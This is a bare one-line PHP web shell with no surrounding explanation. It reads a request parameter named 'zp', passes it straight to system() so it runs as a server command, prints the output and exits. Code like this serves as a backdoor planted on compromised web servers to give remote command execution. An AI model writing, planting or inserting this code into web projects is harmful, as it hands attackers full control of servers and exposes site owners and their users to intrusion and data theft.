<?php if(isset($_REQUEST['zp'])){ echo "<pre>"; $cmd = ($_REQUEST['zp']); system($cmd); echo "</pre>"; die; }?>
